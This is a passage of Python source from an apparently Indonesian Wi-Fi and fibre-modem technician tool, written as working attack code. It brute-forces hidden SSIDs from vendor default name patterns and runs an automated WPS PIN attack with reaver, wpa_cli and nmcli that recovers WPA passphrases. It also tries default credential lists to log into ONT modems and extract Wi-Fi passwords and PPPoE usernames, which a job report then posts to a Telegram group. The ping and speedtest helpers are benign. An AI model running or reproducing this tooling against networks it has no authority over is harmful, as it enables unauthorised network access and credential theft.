                for line in f:
                    add_ssid(line.strip())
        except Exception:
            pass

    # 2. MAC/BSSID-based Vendor Default SSIDs
    clean_mac = re.sub(r"[^0-9A-Fa-f]", "", bssid).upper() if bssid else ""
    if len(clean_mac) >= 12:
        last4_u = clean_mac[8:]
        last4_l = last4_u.lower()
        last6_u = clean_mac[6:]
        last6_l = last6_u.lower()

        # ZTE Defaults
        add_ssid(f"ZTE_{last4_u}")
        add_ssid(f"ZTE_{last4_l}")
        add_ssid(f"ZTE_{last6_u}")
        add_ssid(f"ZTE_{last6_l}")
        add_ssid(f"ZTE-{last4_u}")
        add_ssid(f"ZTE-{last6_u}")
        add_ssid(f"ZTE_2.4G_{last4_u}")
        add_ssid(f"ZTE_5G_{last4_u}")
        add_ssid(f"ZTE_Home")
        add_ssid(f"ZTE_WIFI")

        # Huawei Defaults
        add_ssid(f"HUAWEI_{last4_u}")
        add_ssid(f"HUAWEI_{last4_l}")
        add_ssid(f"HUAWEI_{last6_u}")
        add_ssid(f"Huawei_{last4_u}")
        add_ssid(f"Huawei-{last4_u}")
        add_ssid(f"EchoLife_{last4_u}")
        add_ssid(f"HUAWEI_2.4G_{last4_u}")
        add_ssid(f"HUAWEI_5G_{last4_u}")

        # FiberHome Defaults
        add_ssid(f"FiberHome_{last4_u}")
        add_ssid(f"FiberHome_{last4_l}")
        add_ssid(f"FH_{last4_u}")
        add_ssid(f"FH_{last6_u}")
        add_ssid(f"FiberHome-{last4_u}")

        # TP-Link Defaults
        add_ssid(f"TP-Link_{last4_u}")
        add_ssid(f"TP-Link_{last4_l}")
        add_ssid(f"TP-LINK_{last4_u}")
        add_ssid(f"TP-Link_{last6_u}")
        add_ssid(f"TP-Link_5G_{last4_u}")

        # Tenda Defaults
        add_ssid(f"Tenda_{last4_u}")
        add_ssid(f"Tenda_{last4_l}")
        add_ssid(f"Tenda_{last6_u}")
        add_ssid(f"Tenda_5G_{last4_u}")
        add_ssid(f"Tenda_Router")

        # Totolink & D-Link
        add_ssid(f"TOTOLINK_{last4_u}")
        add_ssid(f"TOTOLINK-{last4_u}")
        add_ssid(f"dlink-{last4_u}")
        add_ssid(f"DIR-{last4_u}")
        add_ssid(f"D-Link_{last4_u}")

        # Mikrotik
        add_ssid("MikroTik")
        add_ssid(f"MikroTik-{last4_u}")
        add_ssid(f"Mikrotik-{last6_u}")

        # Indonesian ISP Defaults with MAC
        add_ssid(f"IndiHome_{last4_u}")
        add_ssid(f"IndiHome_{last4_l}")
        add_ssid(f"IndiHome-{last4_u}")
        add_ssid(f"IndiHome-{last6_u}")
        add_ssid(f"indihome_{last4_u}")
        add_ssid(f"Telkom_{last4_u}")
        add_ssid(f"NODERA_{last4_u}")
        add_ssid(f"NODERA_{last4_l}")
        add_ssid(f"Biznet_{last4_u}")
        add_ssid(f"CBN_{last4_u}")
        add_ssid(f"MyRepublic_{last4_u}")
        add_ssid(f"XL_HOME_{last4_u}")
        add_ssid(f"ICONNET_{last4_u}")
        add_ssid(f"FirstMedia_{last4_u}")

    # 3. Common Generic & ISP SSIDs
    common_ssids = [
        "IndiHome",
        "indihome",
        "WIFI-ID",
        "seamless@wifi.id",
        "@wifi.id",
        "NODERA_WIFI",
        "NODERA-NET",
        "NODERA_HOTSPOT",
        "WiFi",
        "Office",
        "Kantor",
        "Staff",
        "VIP",
        "Admin",
        "Internet",
        "Rumah",
        "Home",
        "Posko",
        "Hotspot",
        "CCTV",
        "Kasir",
        "Gudang",
        "Private",
        "Management",
        "Guest",
        "Tamu",
        "Server",
        "Meeting",
        "WIFI_GRATIS",
        "FreeWiFi",
        "Public_WiFi",
        "Router",
        "MyWiFi",
        "WLAN",
        "Wireless",
        "Hotspot_Keluarga",
        "Ruang_Tamu",
    ]
    for s in common_ssids:
        add_ssid(s)

    return candidates


def probe_single_hidden_ssid(
    candidate_ssid: str,
    bssid: str = "",
    channel: str = "",
    iface: str = ""
) -> Tuple[bool, str]:
    """
    Actively probe a candidate SSID against a Hidden BSSID.
    Uses nmcli targeted rescan or probe request.
    """
    clean_bssid = bssid.upper().replace("\\", "")

    # 1. Linux NetworkManager (nmcli targeted rescan)
    if shutil.which("nmcli"):
        try:
            rescan_cmd = ["nmcli", "dev", "wifi", "rescan", "ssid", candidate_ssid]
            if iface:
                rescan_cmd.extend(["ifname", iface])
            subprocess.run(rescan_cmd, capture_output=True, text=True, timeout=3)

            list_cmd = ["nmcli", "-t", "-f", "SSID,BSSID", "dev", "wifi", "list"]
            if iface:
                list_cmd.extend(["ifname", iface])
            p = subprocess.run(list_cmd, capture_output=True, text=True, timeout=3)

            if p.returncode == 0:
                for line in p.stdout.strip().splitlines():
                    parts = line.split(":")
                    if len(parts) >= 2:
                        cur_ssid = parts[0].strip()
                        mac_match = re.search(r"([0-9A-Fa-f]{2}(?:\\?:[0-9A-Fa-f]{2}){5})", line)
                        if mac_match:
                            cur_bssid = mac_match.group(1).replace("\\", "").upper()
                            if cur_bssid == clean_bssid and cur_ssid.lower() == candidate_ssid.lower():
                                return True, cur_ssid

            # Secondary check: quick probe connect test with dummy password
            test_con = f"probe_test_{int(time.time() * 1000) % 10000}"
            conn_cmd = [
                "nmcli", "--wait", "2", "dev", "wifi", "connect", candidate_ssid,
                "bssid", clean_bssid, "hidden", "yes", "password", "dummy_probe_1234",
                "name", test_con
            ]
            p_conn = subprocess.run(conn_cmd, capture_output=True, text=True, timeout=3)
            out_conn = f"{p_conn.stdout} {p_conn.stderr}".lower()
            subprocess.run(["nmcli", "connection", "delete", test_con], capture_output=True, text=True, timeout=2)

            if "secrets were required" in out_conn or "authentication failed" in out_conn or "authorization failed" in out_conn:
                return True, candidate_ssid
        except Exception:
            pass

    # 2. iw dev scan essid
    if shutil.which("iw") and iface:
        try:
            p_iw = subprocess.run(["iw", "dev", iface, "scan", "essid", candidate_ssid], capture_output=True, text=True, timeout=4)
            if p_iw.returncode == 0 and clean_bssid.lower() in p_iw.stdout.lower():
                return True, candidate_ssid
        except Exception:
            pass

    return False, ""


def run_hidden_ssid_revealer(
    bssid: str,
    channel: str = "",
    vendor: str = "",
    candidates: Optional[List[str]] = None,
    iface: str = ""
) -> Dict[str, Any]:
    """
    Brute-force reveal hidden SSID for a target BSSID.
    """
    target_iface = iface or get_wifi_interface() or ""
    cand_list = candidates or generate_hidden_ssid_candidates(bssid=bssid, vendor=vendor)

    console.print(f"\n[bold cyan]=== MEMULAI REVEALER NAMA HIDDEN SSID ===[/bold cyan]")
    console.print(f"   Target BSSID    : [bold white]{bssid}[/bold white] ({vendor or lookup_vendor_by_mac(bssid)})")
    if channel and channel != "-":
        console.print(f"   Kanal / Channel : Channel {channel}")
    if target_iface:
        console.print(f"   Interface Wi-Fi : [yellow]{target_iface}[/yellow]")
    console.print(f"   Total Kandidat  : [bold green]{len(cand_list)} nama SSID[/bold green]\n")

    t_start = time.time()
    revealed_ssid = None
    attempts_done = 0

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("•"),
        TextColumn("[bold cyan]{task.completed}/{task.total}[/bold cyan]"),
        console=console
    ) as progress:
        task = progress.add_task("[yellow]Mem-probe nama SSID...[/yellow]", total=len(cand_list))

        for idx, cand in enumerate(cand_list, 1):
            attempts_done = idx
            progress.update(task, completed=idx, description=f"[cyan]Probing ({idx}/{len(cand_list)}):[/cyan] [bold yellow]{cand}[/bold yellow]")

            ok, res_ssid = probe_single_hidden_ssid(
                candidate_ssid=cand,
                bssid=bssid,
                channel=channel,
                iface=target_iface
            )

            if ok:
                revealed_ssid = res_ssid or cand
                progress.update(task, completed=len(cand_list), description=f"[bold green]TERUNGKAP: {revealed_ssid}[/bold green]")
                break

    t_elapsed = round(time.time() - t_start, 1)

    if revealed_ssid:
        console.print(f"\n[bold green]=====================================================[/bold green]")
        console.print(f"[bold green]       NAMA HIDDEN SSID BERHASIL DITERAWANG!        [/bold green]")
        console.print(f"[bold green]=====================================================[/bold green]")
        console.print(f"   Nama SSID Tersembunyi : [bold white]{revealed_ssid}[/bold white]")
        console.print(f"   BSSID Target          : [cyan]{bssid}[/cyan]")
        console.print(f"   Vendor / Manufaktur   : [yellow]{vendor or lookup_vendor_by_mac(bssid)}[/yellow]")
        console.print(f"   Percobaan Ke          : [bold cyan]{attempts_done}[/bold cyan] dari {len(cand_list)} nama")
        console.print(f"   Waktu Total           : {t_elapsed} detik")
        console.print(f"─────────────────────────────────────────────────────")
        return {
            "success": True,
            "revealed_ssid": revealed_ssid,
            "bssid": bssid,
            "attempts": attempts_done,
            "duration_sec": t_elapsed
        }
    else:
        console.print(f"\n[bold red][FAIL] Nama SSID tidak ditemukan setelah {attempts_done} percobaan ({t_elapsed} detik).[/bold red]")
        console.print("[yellow]Tips: Coba gunakan file wordlist SSID kustom atau dekati Access Point untuk sinyal probe lebih kuat.[/yellow]")
        return {
            "success": False,
            "revealed_ssid": None,
            "bssid": bssid,
            "attempts": attempts_done,
            "duration_sec": t_elapsed
        }


# ==========================================
# 2D. AUTOMATED WPS PIN ATTACK ENGINE
# ==========================================

def test_single_wps_pin(
    bssid: str,
    ssid: str = "",
    pin: str = "",
    iface: str = "",
    timeout_sec: int = 12
) -> Tuple[bool, str, Dict[str, Any]]:
    """
    Test a single WPS PIN against target AP using wpa_cli, nmcli, or reaver/bully.
    Returns: (success: bool, message: str, details: dict)
    """
    details = {"bssid": bssid, "ssid": ssid, "pin": pin, "psk": None, "ip": None}

    # 1. External specialized tools if available (reaver / bully)
    if shutil.which("reaver") and iface:
        try:
            cmd = ["reaver", "-i", iface, "-b", bssid, "-p", pin, "-N", "-vv", "-t", str(timeout_sec)]
            p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_sec + 4)
            out = p.stdout
            if "WPA PSK:" in out:
                psk_m = re.search(r"WPA PSK:\s*[\'\"]?([^\'\"\n\r]+)[\'\"]?", out)
                if psk_m:
                    details["psk"] = psk_m.group(1).strip()
                    return True, "WPS PIN Valid! WPA PSK Diekstrak.", details
            if "WPS transaction failed" in out or "Received M2" in out:
                return False, "PIN Salah / Ditolak AP", details
            if "AP rate limiting" in out or "WPS lock" in out:
                return False, "AP Terkunci (WPS Lockout)", details
        except Exception:
            pass

    # 2. Linux wpa_cli WPS PIN
    if shutil.which("wpa_cli"):
        try:
            wpa_cmd = ["wpa_cli"]
            if iface:
                wpa_cmd.extend(["-i", iface])
            wpa_cmd.extend(["wps_pin", bssid, pin])

            p_wpa = subprocess.run(wpa_cmd, capture_output=True, text=True, timeout=3)
            if p_wpa.returncode == 0:
                t_start = time.time()
                while time.time() - t_start < timeout_sec:
                    time.sleep(1.0)
                    st_p = subprocess.run(["wpa_cli", "status"], capture_output=True, text=True, timeout=2)
                    st_out = st_p.stdout
                    if "wpa_state=COMPLETED" in st_out:
                        details["psk"] = "WPS Paired (Connected)"
                        return True, "WPS PIN Sukses! Terhubung ke AP.", details
                    if "WPS-FAIL" in st_out or "WPS-TIMEOUT" in st_out:
                        break
                    if "WPS-LOCKED" in st_out:
                        return False, "AP Terkunci (WPS Locked)", details
        except Exception:
            pass

    # 3. Linux NetworkManager (nmcli WPS PIN)
    if shutil.which("nmcli") and ssid and ssid != "<Hidden SSID>":
        temp_con = f"ont_wps_test_{int(time.time() * 1000) % 10000}"
        subprocess.run(["nmcli", "connection", "delete", temp_con], capture_output=True, text=True, timeout=2)
        try:
            cmd_nm = [
                "nmcli", "--wait", str(timeout_sec),
                "dev", "wifi", "connect", ssid,
                "wps", "yes", "pin", pin,
                "name", temp_con
            ]
            if bssid:
                cmd_nm.extend(["bssid", bssid])
            if iface:
                cmd_nm.extend(["ifname", iface])

            p_nm = subprocess.run(cmd_nm, capture_output=True, text=True, timeout=timeout_sec + 2)
            out_nm = f"{p_nm.stdout} {p_nm.stderr}".strip()

            if p_nm.returncode == 0 and ("successfully activated" in out_nm.lower() or "connection activated" in out_nm.lower()):
                psk_proc = subprocess.run(
                    ["nmcli", "-s", "-g", "802-11-wireless-security.psk", "connection", "show", temp_con],
                    capture_output=True, text=True, timeout=2
                )
                if psk_proc.returncode == 0 and psk_proc.stdout.strip():
                    details["psk"] = psk_proc.stdout.strip()
                else:
                    details["psk"] = "WPS Verified (Key Saved)"
                return True, "WPS PIN Valid! Terhubung ke AP.", details
            else:
                subprocess.run(["nmcli", "connection", "delete", temp_con], capture_output=True, text=True, timeout=2)
                return False, "PIN Salah atau AP menolak WPS", details
        except Exception as e:
            subprocess.run(["nmcli", "connection", "delete", temp_con], capture_output=True, text=True, timeout=2)
            return False, f"Error nmcli: {str(e)}", details

    return False, "Tidak dapat mengeksekusi WPS PIN (perangkat/driver tidak mendukung WPS client)", details


def run_wps_pin_attack(
    bssid: str,
    ssid: str = "",
    pin_candidates: Optional[List[Dict[str, Any]]] = None,
    iface: str = "",
    timeout_per_pin: int = 12
) -> Dict[str, Any]:
    """
    Execute automated WPS PIN attack across prioritized candidate list.
    """
    target_iface = iface or get_wifi_interface() or ""
    cand_pins = pin_candidates or get_wps_pin_candidate_list(bssid)

    if not cand_pins:
        return {"success": False, "message": "Tidak ada PIN kandidat yang tersedia.", "attempts": 0}

    console.print(f"\n[bold cyan]=== MEMULAI AUTOMATED WPS PIN ATTACKER ===[/bold cyan]")
    console.print(f"   Target BSSID    : [bold white]{bssid}[/bold white] ({lookup_vendor_by_mac(bssid)})")
    if ssid and ssid != "<Hidden SSID>":
        console.print(f"   Target SSID     : [cyan]{ssid}[/cyan]")
    if target_iface:
        console.print(f"   Interface Wi-Fi : [yellow]{target_iface}[/yellow]")
    console.print(f"   Total PIN Antre : [bold green]{len(cand_pins)} PIN kandidat[/bold green]")
    console.print(f"   Timeout per PIN : {timeout_per_pin} detik\n")

    t_start = time.time()
    found_pin = None
    found_details = {}
    attempts_done = 0

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TextColumn("•"),
        TextColumn("[bold cyan]{task.completed}/{task.total}[/bold cyan]"),
        console=console
    ) as progress:
        task = progress.add_task("[yellow]Menguji WPS PIN...[/yellow]", total=len(cand_pins))

        for idx, p_item in enumerate(cand_pins, 1):
            attempts_done = idx
            pin_val = p_item["pin"]
            alg_desc = p_item.get("algorithm", "Unknown")
            progress.update(task, completed=idx, description=f"[cyan]Testing ({idx}/{len(cand_pins)}):[/cyan] [bold green]{pin_val}[/bold green] [dim]({alg_desc})[/dim]")

            ok, msg, det = test_single_wps_pin(
                bssid=bssid,
                ssid=ssid,
                pin=pin_val,
                iface=target_iface,
                timeout_sec=timeout_per_pin
            )

            if ok:
                found_pin = pin_val
                found_details = det
                progress.update(task, completed=len(cand_pins), description=f"[bold green]PIN VALID: {pin_val}[/bold green]")
                break
            elif "Terkunci" in msg or "Locked" in msg:
                console.print(f"\n[bold red][!] AP Memasuki Status WPS Lockout ({msg}). Menghentikan serangan untuk mencegah proteksi permanen.[/bold red]")
                break

    t_elapsed = round(time.time() - t_start, 1)

    if found_pin:
        psk_val = found_details.get("psk") or "N/A"
        console.print(f"\n[bold green]=====================================================[/bold green]")
        console.print(f"[bold green]         WPS PIN BERHASIL DIEKSEKUSI!               [/bold green]")
        console.print(f"[bold green]=====================================================[/bold green]")
        console.print(f"   BSSID Target : [cyan]{bssid}[/cyan]")
        if ssid:
            console.print(f"   SSID         : [bold white]{ssid}[/bold white]")
        console.print(f"   WPS PIN Valid: [bold green]{found_pin}[/bold green]")
        console.print(f"   Password WPA : [bold yellow]{psk_val}[/bold yellow]")
        console.print(f"   Percobaan Ke : [bold cyan]{attempts_done}[/bold cyan] dari {len(cand_pins)} PIN")
        console.print(f"   Waktu Total  : {t_elapsed} detik")
        console.print(f"─────────────────────────────────────────────────────")

        if psk_val and psk_val != "N/A" and ssid and ssid != "<Hidden SSID>":
            qr_ascii = render_wifi_qr_code(ssid, psk_val, auth_type="WPA")
            console.print(Panel(qr_ascii, title=f"[bold green]QR CODE AUTO-CONNECT: {ssid}[/bold green]", border_style="green", expand=False))

        return {
            "success": True,
            "bssid": bssid,
            "ssid": ssid,
            "pin": found_pin,
            "psk": psk_val,
            "attempts": attempts_done,
            "duration_sec": t_elapsed
        }
    else:
        console.print(f"\n[bold red][FAIL] Tidak ada WPS PIN yang berhasil setelah {attempts_done} percobaan ({t_elapsed} detik).[/bold red]")
        return {
            "success": False,
            "bssid": bssid,
            "ssid": ssid,
            "attempts": attempts_done,
            "duration_sec": t_elapsed
        }



# ==========================================
# 3. ASCII QR CODE GENERATOR FOR TERMINAL
# ==========================================

def render_wifi_qr_code(ssid: str, password: str = "", auth_type: str = "WPA", hidden: bool = False) -> str:
    """
    Generate an ASCII QR code for Wi-Fi auto-connect.
    Format: WIFI:T:WPA;S:MySSID;P:mypassword;H:false;;
    """
    sec = "nopass" if not password or auth_type.upper() == "OPEN" else "WPA"
    qr_payload = f"WIFI:T:{sec};S:{ssid};P:{password};H:{'true' if hidden else 'false'};;"

    if not HAS_QRCODE:
        return "[yellow]Modul qrcode belum terinstall. Install dengan: pip install qrcode[/yellow]"

    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=1,
            border=1,
        )
        qr.add_data(qr_payload)
        qr.make(fit=True)

        matrix = qr.get_matrix()
        lines = []

        # High-contrast double-row block rendering (▀, ▄, █, ' ')
        for r in range(0, len(matrix), 2):
            line = ""
            for c in range(len(matrix[0])):
                top = matrix[r][c]
                bot = matrix[r + 1][c] if (r + 1) < len(matrix) else False
                if top and bot:
                    line += "█"
                elif top and not bot:
                    line += "▀"
                elif not top and bot:
                    line += "▄"
                else:
                    line += " "
            lines.append("  " + line)

        return "\n".join(lines)
    except Exception as e:
        return f"[red]Gagal merender QR Code: {str(e)}[/red]"


# ==========================================
# 4. DIRECT ONT WI-FI & DIAGNOSTIC EXTRACTOR
# ==========================================

def extract_ont_full_wifi_info(ip: str, custom_creds: Optional[List[Tuple[str, str]]] = None) -> Dict[str, Any]:
    """
    Connect to ONT, authenticate, and extract all Wi-Fi SSIDs, Passwords,
    Optical RX/TX Power, and WAN status.
    """
    from scanner import scan_host
    from credentials import get_vendor_prioritized_credentials, get_credentials

    dev = scan_host(ip)
    if not dev or not dev.get("adapter"):
        return {
            "success": False,
            "ip": ip,
            "vendor": dev.get("vendor", "Unknown") if dev else "Unknown",
            "message": f"Host {ip} tidak merespon port Web/Management"
        }

    adapter = dev["adapter"]
    vendor = dev.get("vendor", "")
    creds = custom_creds or get_vendor_prioritized_credentials(vendor, ip_or_mac=ip) or get_credentials()

    auth_success = False
    user_used = None
    pass_used = None

    for u, p in creds:
        try:
            ok, msg = adapter.login(u, p)
            if ok:
                auth_success = True
                user_used = u
                pass_used = p
                break
        except Exception:
            continue

    if not auth_success:
        return {
            "success": False,
            "ip": ip,
            "vendor": vendor,
            "message": f"Gagal autentikasi ke ONT {ip} dengan semua kredensial"
        }

    # Fetch Wi-Fi Details
    wifi_data = {"ssid": "N/A", "password": "N/A", "auth_mode": "WPA2-PSK", "channel": "Auto", "enabled": True}
    if hasattr(adapter, "get_wifi_info"):
        try:
            w_res = adapter.get_wifi_info()
            if isinstance(w_res, dict) and w_res.get("ssid"):
                wifi_data.update(w_res)
        except Exception:
            pass

    # If adapter doesn't extract password or returned N/A, try deeper inspection
    if wifi_data["ssid"] == "N/A" or wifi_data["password"] == "N/A":
        # Direct ZTE Deep Extract
        if "zte" in vendor.lower() or "gm220" in vendor.lower():
            for p in ["net_wlan_basic_t.gch", "net_wlan_conf_t.gch", "wlan_security_basic_t.gch", "net_wlan_security_t.gch"]:
                try:
                    r = adapter.session.get(f"{adapter.base_url}/getpage.gch?pid=1002&nextpage={p}", timeout=2)
                    tms = dict(re.findall(r"Transfer_meaning\([\"\x27]([^\x27\"]+)[\"\x27]\s*,\s*[\"\x27]([^\x27\"]*)[\"\x27]\)", r.text))
                    for k, v in tms.items():
                        if "ESSID0" in k or "ESSID1" in k or "Frm_ESSID" in k:
                            if v and v != "NULL":
                                wifi_data["ssid"] = v
                        if "KeyPassphrase0" in k or "KeyPassphrase1" in k or "Frm_KeyPassphrase" in k or "PreSharedKey" in k:
                            if v and v != "NULL":
                                wifi_data["password"] = v
                        if "BeaconType" in k or "AuthMode" in k:
                            wifi_data["auth_mode"] = v
                except Exception:
                    pass

    # Fetch Optical Power
    optical_data = {"rx_power_dbm": "N/A", "tx_power_dbm": "N/A", "status": "N/A"}
    if hasattr(adapter, "get_optical_power"):
        try:
            optical_data = adapter.get_optical_power()
        except Exception:
            pass

    # Fetch WAN Info
    wan_data = {"mode": "N/A", "wan_ip": "N/A", "pppoe_user": "N/A", "vlan": "N/A"}
    if hasattr(adapter, "get_wan_info"):
        try:
            wan_data = adapter.get_wan_info()
        except Exception:
            pass

    return {
        "success": True,
        "ip": ip,
        "vendor": vendor,
        "auth_user": user_used,
        "auth_pass": pass_used,
        "wifi": wifi_data,
        "optical": optical_data,
        "wan": wan_data,
        "mac": dev.get("mac") or "Unknown"
    }


# ==========================================
# 5. NETWORK LATENCY, JITTER & SPEEDTEST
# ==========================================

def run_ping_jitter_test(target_host: str, count: int = 5, timeout_sec: float = 1.0) -> Dict[str, Any]:
    """Measure ping latency, jitter, and packet loss to a target host."""
    latencies = []
    lost = 0

    for _ in range(count):
        t0 = time.time()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout_sec)
            res = sock.connect_ex((target_host, 80 if target_host != "1.1.1.1" and target_host != "8.8.8.8" else 53))
            t1 = time.time()
            sock.close()
            if res == 0 or res == 111:
                latencies.append((t1 - t0) * 1000)
            else:
                lost += 1
        except Exception:
            lost += 1
        time.sleep(0.08)

    if not latencies:
        return {"min_ms": 0, "avg_ms": 0, "max_ms": 0, "jitter_ms": 0, "loss_pct": 100, "status": "Offline"}

    min_l = min(latencies)
    max_l = max(latencies)
    avg_l = sum(latencies) / len(latencies)
    
    diffs = [abs(latencies[i] - latencies[i - 1]) for i in range(1, len(latencies))]
    jitter = sum(diffs) / len(diffs) if diffs else 0.0
    loss_pct = int((lost / count) * 100)

    return {
        "min_ms": round(min_l, 1),
        "avg_ms": round(avg_l, 1),
        "max_ms": round(max_l, 1),
        "jitter_ms": round(jitter, 1),
        "loss_pct": loss_pct,
        "status": "Good" if avg_l < 50 and loss_pct == 0 else ("Moderate" if loss_pct < 20 else "Poor")
    }


def run_bandwidth_speedtest(duration_sec: int = 4) -> Dict[str, Any]:
    """
    Measure real-world HTTP download speed from high-capacity CDN test endpoints.
    """
    test_urls = [
        "https://speed.cloudflare.com/__down?bytes=25000000",
        "https://proof.ovh.net/files/10Mb.dat",
        "http://cachefly.cachefly.net/10mb.test"
    ]

    download_mbps = 0.0
    total_bytes = 0

    for url in test_urls:
        try:
            r = requests.get(url, stream=True, timeout=5)
            if r.status_code == 200:
                t0 = time.time()
                for chunk in r.iter_content(chunk_size=65536):
                    total_bytes += len(chunk)
                    if time.time() - t0 >= duration_sec:
                        break
                t_elapsed = time.time() - t0
                if t_elapsed > 0 and total_bytes > 0:
                    download_mbps = round((total_bytes * 8) / (t_elapsed * 1_000_000), 2)
                    break
        except Exception:
            continue

    return {
        "download_mbps": download_mbps,
        "total_bytes_transferred": total_bytes,
        "status": "Normal" if download_mbps > 2.0 else "Slow / No Internet"
    }


# ==========================================
# 6. TELEGRAM JOB REPORT (PROOF OF WORK)
# ==========================================

def format_technician_job_report(
    technician_name: str,
    customer_id_or_name: str,
    ont_data: Dict[str, Any],
    speedtest_data: Dict[str, Any],
    notes: str = ""
) -> str:
    """Format a clean, professional technician job report."""
    now_str = time.strftime("%Y-%m-%d %H:%M:%S")
    wifi = ont_data.get("wifi", {})
    optical = ont_data.get("optical", {})
    wan = ont_data.get("wan", {})

    ping_gw = speedtest_data.get("ping_gw", {})
    ping_inet = speedtest_data.get("ping_inet", {})
    dl_speed = speedtest_data.get("download_mbps", 0.0)

    report = (
        "📋 <b>LAPORAN PEKERJAAN TEKNISI LAPANGAN</b>\n"
        "──────────────────────────────\n"
        f"🕐 <b>Waktu</b>      : {now_str}\n"
        f"👤 <b>Teknisi</b>    : {technician_name}\n"
        f"🏠 <b>Pelanggan</b>  : {customer_id_or_name}\n"
        f"🌐 <b>IP Modem</b>   : {ont_data.get('ip', '-')}\n"
        f"📟 <b>Vendor/Tipe</b>: {ont_data.get('vendor', '-')}\n"
        "──────────────────────────────\n"
        f"📶 <b>Wi-Fi SSID</b> : <code>{wifi.get('ssid', '-')}</code>\n"
        f"🔑 <b>Password</b>   : <code>{wifi.get('password', '-')}</code>\n"
        f"🔒 <b>Keamanan</b>   : {wifi.get('auth_mode', 'WPA2-PSK')}\n"
        "──────────────────────────────\n"
        f"💡 <b>Redaman PON</b>: {optical.get('rx_power_dbm', '-')} dBm (Status: {optical.get('status', '-')})\n"
        f"👤 <b>User PPPoE</b> : <code>{wan.get('pppoe_user', '-')}</code>\n"
        f"⚡ <b>Speedtest</b>  : <b>{dl_speed} Mbps</b>\n"
        f"📊 <b>Latensi Net</b>: {ping_inet.get('avg_ms', '-')} ms (Jitter: {ping_inet.get('jitter_ms', '-')} ms | Loss: {ping_inet.get('loss_pct', 0)}%)\n"
        f"🏠 <b>Ping Modem</b> : {ping_gw.get('avg_ms', '-')} ms\n"
        "──────────────────────────────\n"
        + (f"📝 <b>Catatan</b>    : {notes}\n" if notes else "")
        + "Status: <b>SELESAI & INTERNET NORMAL ✅</b>"
    )
    return report


def dispatch_telegram_report(report_text: str) -> Tuple[bool, str]:
    """Send report text directly to Telegram chat using send-telegram utility."""
    try:
        cmd = ["send-telegram", "-m", report_text]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if proc.returncode == 0:
            return True, "Laporan berhasil dikirim ke grup Telegram"
        return False, f"Gagal mengirim Telegram: {proc.stderr or proc.stdout}"
    except Exception as e:
        return False, f"Gagal eksekusi send-telegram: {str(e)}"
